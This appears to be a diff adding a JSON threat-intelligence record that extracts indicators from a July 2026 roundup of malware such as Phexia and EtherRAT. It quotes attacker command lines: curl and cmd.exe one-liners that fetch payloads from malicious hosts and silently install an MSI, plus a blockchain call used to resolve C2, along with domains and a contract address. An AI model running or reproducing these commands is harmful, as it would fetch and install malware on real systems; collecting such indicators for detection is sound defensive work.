@@ -1,0 +1,157 @@
+{
+  "malware_family": "Phexia, EtherRAT, CastleRAT, GraphSpy",
+  "threat_actor": "",
+  "platforms": [
+    "windows",
+    "macos",
+    "linux"
+  ],
+  "summary": "This Zscaler/Red Canary Intelligence Insights roundup covers July 2026's top 10 threats, with debuts by GraphSpy, Phexia, CastleRAT and EtherRAT. Three of the new entrants (Phexia, CastleRAT, EtherRAT) use blockchain-based dead drop resolution (\"EtherHiding\") to dynamically fetch C2 URLs from public RPC endpoints and smart contracts. Phexia resolves a C2 URL from a Polygon smart contract and pipes the response into osascript, while EtherRAT is delivered via a paste-and-run MSI and runs disguised as .ini/.tmp/.dat files.",
+  "mitre_techniques": [],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "curl -A \"Mac OS X 10_15_7\" -fsSL gl1nto.spiintforge[.]ru/04jhdkq5",
+      "context": "Phexia malicious copy-and-paste lure on macOS",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl -s --max-time 15 hxxps[://]polygon[.]drpc[.]org -X POST -H 'Content-Type: application/json' --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_call\",\"params\":[{\"to\":\"0xA3a603F8a454a9c905b4c579Bb72628F7C15C2A0\",\"data\":\"0x2686ecea\"},\"latest\"],\"id\":1}'",
+      "context": "Phexia queries Polygon smart contract for C2 URL",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "cmd.exe /v:on /c \"set r=%RANDOM%... && curl -s -L -o C:\\users\\[redacted]\\AppData\\Local\\!r!.msi reeemso[.]forwardbox[.]co[.]uk/132/ts.msi && msiexec /i ... /qn\"",
+      "context": "EtherRAT MSI delivered via paste-and-run; parent cmd.exe",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "0xA3a603F8a454a9c905b4c579Bb72628F7C15C2A0",
+      "context": "Polygon smart contract address holding Phexia C2 URL",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "0x2686ecea",
+      "context": "eth_call function selector/data POSTed to resolved Phexia C2 URL",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "LaunchAgent plist ProgramArguments running base64 AppleScript via osascript; KeepAlive and RunAtLoad set true",
+      "context": "Phexia macOS LaunchAgent persistence",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "osascript",
+      "context": "Phexia executes base64-encoded AppleScript payload",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "pythonw",
+      "context": "CastleRAT dead drop resolution beacon",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "gl1nto.spiintforge.ru",
+      "context": "Phexia payload host in paste-and-run lure",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/04jhdkq5",
+      "context": "Phexia payload path fetched by curl",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "reeemso.forwardbox.co.uk",
+      "context": "EtherRAT MSI host (ts.msi)",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/132/ts.msi",
+      "context": "EtherRAT installer download path",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "polygon.drpc.org",
+      "context": "Public Polygon RPC endpoint queried by Phexia",
+      "specificity": "low",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "ethereum-rpc.publicnode.com",
+      "context": "Public Ethereum RPC endpoint used for smart contract eth_call",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "steamcommunity.com",
+      "context": "CastleRAT dead drop resolution service",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "pe",
+    "macho",
+    "script"
+  ]
+}
